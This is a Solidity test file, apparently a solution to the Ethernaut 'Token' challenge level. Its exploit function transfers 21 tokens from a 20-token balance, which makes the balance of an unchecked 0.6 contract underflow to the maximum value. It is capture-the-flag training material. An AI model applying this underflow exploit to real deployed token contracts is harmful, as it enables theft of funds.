// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Token.sol";
import "src/levels/TokenFactory.sol";

contract TestToken is BaseTest {
    Token private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new TokenFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Token(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.balanceOf(player), 20);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // We start with a balance of 20 tokens. Token contract uses 0.6 compiler and does not check
        // for arithmetic over/under flow. If we transfer more than 20 tokens, our balance will underflow
        // we will end up with a balance way more than 20.
        level.transfer(vm.addr(1), 21);

        assertEq(level.balanceOf(player), 2**256 - 1);

        vm.stopPrank();
    }
}
